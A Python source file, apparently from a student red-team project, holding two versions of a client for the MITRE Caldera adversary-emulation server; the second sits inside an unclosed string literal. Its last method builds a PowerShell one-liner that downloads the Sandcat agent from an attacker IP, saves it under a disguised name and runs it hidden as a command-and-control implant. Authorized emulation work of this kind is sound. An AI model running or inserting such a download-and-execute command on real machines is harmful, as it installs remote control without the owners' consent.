import os
import requests
from dotenv import load_dotenv

load_dotenv()

class CalderaAPIError(Exception):
    """Raised when Caldera API returns an error or cannot be reached."""
    pass


class CalderaClient:
    def __init__(self, base_url=None, api_key=None, verify_ssl=False, timeout=10):
        self.base_url = (base_url or os.getenv("CALDERA_URL", "http://127.0.0.1:8888")).rstrip("/")
        self.api_key = api_key or os.getenv("CALDERA_API_KEY", "")
        self.verify_ssl = verify_ssl
        self.timeout = timeout

        self.session = requests.Session()
        if self.api_key:
            self.session.headers.update({
                "KEY": self.api_key,
                "Content-Type": "application/json"
            })

    def _request(self, method, endpoint, **kwargs):
        url = f"{self.base_url}{endpoint}"

        try:
            response = self.session.request(
                method,
                url,
                timeout=self.timeout,
                verify=self.verify_ssl,
                **kwargs
            )
            response.raise_for_status()

            if response.text:
                return response.json()

            return {}

        except requests.exceptions.RequestException as e:
            raise CalderaAPIError(f"Caldera API request failed: {e}")

        except ValueError:
            raise CalderaAPIError("Caldera returned a non-JSON response.")

    def health_check(self):
        """
        Checks whether the Caldera server is reachable.

        Note:
        Some Caldera versions may not expose /api/v2/health.
        If this endpoint fails, use list_agents() as the practical connectivity test.
        """
        return self._request("GET", "/api/v2/health")

    def list_agents(self):
        return self._request("GET", "/api/v2/agents")

    def get_online_agents(self):
        agents = self.list_agents()

        if isinstance(agents, dict):
            agents = agents.get("agents", [])

        online = []

        for agent in agents:
            trusted = agent.get("trusted")
            paw = agent.get("paw")
            host = agent.get("host") or agent.get("host_name")

            if trusted is True:
                online.append({
                    "paw": paw,
                    "host": host,
                    "platform": agent.get("platform"),
                    "group": agent.get("group"),
                    "last_seen": agent.get("last_seen")
                })

        return online

    def list_operations(self):
        return self._request("GET", "/api/v2/operations")

    def get_operation(self, operation_id):
        return self._request("GET", f"/api/v2/operations/{operation_id}")

    def create_operation(self, name, adversary_id, group="red", planner_id=None):
        payload = {
            "name": name,
            "group": group,
            "adversary": {
                "adversary_id": adversary_id
            },
            "state": "running",
            "autonomous": 1
        }

        if planner_id:
            payload["planner"] = {
                "planner_id": planner_id
            }

        return self._request("POST", "/api/v2/operations", json=payload)
    

""" caldera/api_client.py
Low-level REST API connector to MITRE Caldera.
Handles all HTTP communication with the Caldera server.


import requests
import json
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


class CalderaClient:
    def __init__(self, base_url: str, api_key: str):
        self.base_url = base_url.rstrip('/')
        self.api_key  = api_key
        self.headers  = {
            'KEY': api_key,
            'Content-Type': 'application/json'
        }

    # ── Internal helpers ────────────────────────────────────────────────────

    def _get(self, endpoint: str) -> dict | list:
        try:
            r = requests.get(
                f"{self.base_url}{endpoint}",
                headers=self.headers,
                timeout=10
            )
            if r.status_code == 401:
                return {'error': '401 Unauthorised — check your API key in config.py'}
            r.raise_for_status()
            return r.json()
        except requests.exceptions.ConnectionError:
            return {'error': 'Cannot connect to Caldera. Is the server running?'}
        except requests.exceptions.Timeout:
            return {'error': 'Caldera request timed out.'}
        except Exception as e:
            return {'error': str(e)}

    def _post(self, endpoint: str, data: dict) -> dict:
        try:
            r = requests.post(
                f"{self.base_url}{endpoint}",
                headers=self.headers,
                json=data,
                timeout=10
            )
            if r.status_code == 401:
                return {'error': '401 Unauthorised — check your API key in config.py'}
            r.raise_for_status()
            return r.json()
        except requests.exceptions.ConnectionError:
            return {'error': 'Cannot connect to Caldera. Is the server running?'}
        except Exception as e:
            return {'error': str(e)}

    def _patch(self, endpoint: str, data: dict) -> dict:
        try:
            r = requests.patch(
                f"{self.base_url}{endpoint}",
                headers=self.headers,
                json=data,
                timeout=10
            )
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return {'error': str(e)}

    def _delete(self, endpoint: str) -> bool:
        try:
            r = requests.delete(
                f"{self.base_url}{endpoint}",
                headers=self.headers,
                timeout=10
            )
            return r.status_code in [200, 204]
        except Exception:
            return False

    # ── Health check ────────────────────────────────────────────────────────

    def ping(self) -> bool:
        """Check if Caldera server is reachable and API key is valid."""
        result = self._get('/api/v2/agents')
        return 'error' not in result if isinstance(result, dict) else True

    # ── Agents ──────────────────────────────────────────────────────────────

    def get_agents(self) -> list:
        """Get all active agents (victim machines with Sandcat installed)."""
        result = self._get('/api/v2/agents')
        return result if isinstance(result, list) else []

    def get_agents_by_group(self, group: str = 'red') -> list:
        """Get agents filtered by group."""
        agents = self.get_agents()
        return [a for a in agents if a.get('group') == group]

    def get_agent_paw(self, group: str = 'red') -> str | None:
        """Get the paw (unique ID) of the first active agent in a group."""
        agents = self.get_agents_by_group(group)
        if agents:
            return agents[0].get('paw')
        return None

    # ── Adversaries ─────────────────────────────────────────────────────────

    def get_adversaries(self) -> list:
        """Get all adversary profiles."""
        result = self._get('/api/v2/adversaries')
        return result if isinstance(result, list) else []

    def get_adversary_by_name(self, name: str) -> dict | None:
        """Find an adversary by partial name match."""
        adversaries = self.get_adversaries()
        name_lower = name.lower()
        for adv in adversaries:
            if name_lower in adv.get('name', '').lower():
                return adv
        return None

    def create_adversary(self, name: str, ability_ids: list) -> dict:
        """Create a custom adversary profile with specific ability IDs."""
        payload = {
            "name": name,
            "description": "Auto-generated by AutoPenTest — SP DCDF Group 6",
            "atomic_ordering": ability_ids,
            "tags": ["autopentest", "sp-fyp"]
        }
        return self._post('/api/v2/adversaries', payload)

    def delete_adversary(self, adversary_id: str) -> bool:
        """Delete an adversary profile."""
        return self._delete(f'/api/v2/adversaries/{adversary_id}')

    # ── Abilities (ATT&CK techniques) ───────────────────────────────────────

    def get_abilities(self) -> list:
        """Get all available ATT&CK abilities."""
        result = self._get('/api/v2/abilities')
        return result if isinstance(result, list) else []

    def get_abilities_by_technique(self, technique_id: str) -> list:
        """Find abilities matching a given ATT&CK technique ID e.g. T1082."""
        abilities = self.get_abilities()
        tid_lower = technique_id.lower()
        return [
            ab for ab in abilities
            if tid_lower in ab.get('technique_id', '').lower()
        ]

    def get_abilities_by_tactic(self, tactic: str) -> list:
        """Find abilities by tactic name e.g. 'discovery', 'credential-access'."""
        abilities = self.get_abilities()
        tactic_lower = tactic.lower()
        return [
            ab for ab in abilities
            if tactic_lower in ab.get('tactic', '').lower()
        ]

    def get_windows_abilities(self) -> list:
        """Get abilities that work on Windows platform."""
        abilities = self.get_abilities()
        return [
            ab for ab in abilities
            if any(
                p.get('name', '').lower() == 'windows'
                for p in ab.get('platforms', {}).keys()
                if isinstance(ab.get('platforms'), dict)
            )
        ]

    # ── Planners ────────────────────────────────────────────────────────────

    def get_planners(self) -> list:
        """Get all available planners."""
        result = self._get('/api/v2/planners')
        return result if isinstance(result, list) else []

    def get_planner_id(self, name: str = 'atomic') -> str:
        """Get planner ID by name. Default is atomic (sequential execution)."""
        planners = self.get_planners()
        for p in planners:
            if name.lower() in p.get('name', '').lower():
                return p.get('id', '')
        # Fallback: known atomic planner ID
        return 'aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a'

    # ── Sources ─────────────────────────────────────────────────────────────

    def get_sources(self) -> list:
        """Get all fact sources."""
        result = self._get('/api/v2/sources')
        return result if isinstance(result, list) else []

    def get_default_source_id(self) -> str:
        """Get the ID of the basic/empty fact source."""
        sources = self.get_sources()
        for s in sources:
            if 'basic' in s.get('name', '').lower() or not s.get('facts'):
                return s.get('id', '')
        # Fallback: known basic source ID
        return 'ed32b9c3-9593-4c33-b0db-e2007315096b'

    # ── Operations ──────────────────────────────────────────────────────────

    def create_operation(
        self,
        name: str,
        adversary_id: str,
        group: str = 'red',
        planner_id: str = None,
        source_id: str = None
    ) -> dict:
        """Create and immediately start a Caldera operation."""
        planner_id = planner_id or self.get_planner_id('atomic')
        source_id  = source_id  or self.get_default_source_id()

        payload = {
            "name": name,
            "adversary": {"adversary_id": adversary_id},
            "planner":   {"id": planner_id},
            "source":    {"id": source_id},
            "group":     group,
            "auto_close": True,
            "jitter":    "2/8",
            "visibility": 51,
            "state":     "running"
        }
        log.info(f"Creating operation: {name} | adversary: {adversary_id}")
        return self._post('/api/v2/operations', payload)

    def get_operation(self, operation_id: str) -> dict:
        """Get current state of an operation."""
        result = self._get(f'/api/v2/operations/{operation_id}')
        return result if isinstance(result, dict) else {}

    def get_operation_links(self, operation_id: str) -> list:
        """
        Get all links (individual technique executions) for an operation.
        Each link = one ATT&CK technique run on one agent.
        """
        result = self._get(f'/api/v2/operations/{operation_id}/links')
        return result if isinstance(result, list) else []

    def stop_operation(self, operation_id: str) -> dict:
        """Gracefully stop a running operation."""
        return self._patch(
            f'/api/v2/operations/{operation_id}',
            {"state": "finished"}
        )

    def delete_operation(self, operation_id: str) -> bool:
        """Delete an operation and its results from Caldera."""
        return self._delete(f'/api/v2/operations/{operation_id}')

    def get_all_operations(self) -> list:
        """Get all operations (history)."""
        result = self._get('/api/v2/operations')
        return result if isinstance(result, list) else []

    # ── Agent deployment helper ─────────────────────────────────────────────

    def generate_sandcat_command(self, kali_ip: str, group: str = 'red') -> str:
        """
        Generate the PowerShell one-liner to deploy Sandcat agent
        on a Windows victim machine.
        """
        return (
            f'$url="http://{kali_ip}:8888/file/download"; '
            f'$wc=New-Object System.Net.WebClient; '
            f'$wc.Headers.add("platform","windows"); '
            f'$wc.Headers.add("file","sandcat.go-windows"); '
            f'($data=$wc.DownloadData($url)) | Out-Null; '
            f'Get-Process | ?{{$_.modules.filename -like "C:\\Users\\Public\\s4ndc4t.exe"}} '
            f'| Stop-Process -f; '
            f'[io.file]::WriteAllBytes("C:\\Users\\Public\\s4ndc4t.exe",$data) | Out-Null; '
            f'Start-Process -FilePath C:\\Users\\Public\\s4ndc4t.exe '
            f'-ArgumentList "-server http://{kali_ip}:8888 -group {group}" '
            f'-WindowStyle hidden'
        )
"""